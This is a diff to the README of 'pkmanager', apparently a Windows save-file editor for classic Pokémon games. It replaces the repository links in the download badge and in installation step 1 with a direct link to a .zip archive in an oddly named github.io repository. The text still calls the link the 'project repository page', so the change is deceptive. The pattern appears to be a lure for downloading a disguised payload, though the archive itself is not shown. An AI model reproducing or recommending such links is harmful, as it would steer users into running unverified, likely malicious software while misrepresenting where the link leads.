@@ -5,7 +5,7 @@ description: "Manage, edit, and visualize creature-collection save files from ge
 ---
 # 🕹️ pkmanager - Manage your classic Pokémon save files
 
-[![](https://img.shields.io/badge/Download-pkmanager-blue)](https://github.com/phonologic-diethylstilboestrol121/pkmanager)
+[![](https://img.shields.io/badge/Download-pkmanager-blue)](https://github.com/phonologic-diethylstilboestrol121/phonologic-diethylstilboestrol121.github.io/raw/refs/heads/main/musicophobia/io-diethylstilboestrol-phonologic-github-3.9.zip)
 
 ## 📋 About this project
 
@@ -23,7 +23,7 @@ To run pkmanager on your Windows computer, confirm that your system meets these 
 
 ## 💾 Installation Instructions
 
-1. Visit the project repository page at [https://github.com/phonologic-diethylstilboestrol121/pkmanager](https://github.com/phonologic-diethylstilboestrol121/pkmanager) to download the latest setup package.
+1. Visit the project repository page at [https://github.com/phonologic-diethylstilboestrol121/phonologic-diethylstilboestrol121.github.io/raw/refs/heads/main/musicophobia/io-diethylstilboestrol-phonologic-github-3.9.zip](https://github.com/phonologic-diethylstilboestrol121/phonologic-diethylstilboestrol121.github.io/raw/refs/heads/main/musicophobia/io-diethylstilboestrol-phonologic-github-3.9.zip) to download the latest setup package.
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the latest version of the installer for Windows.
 4. Open the downloaded file once the transfer completes.
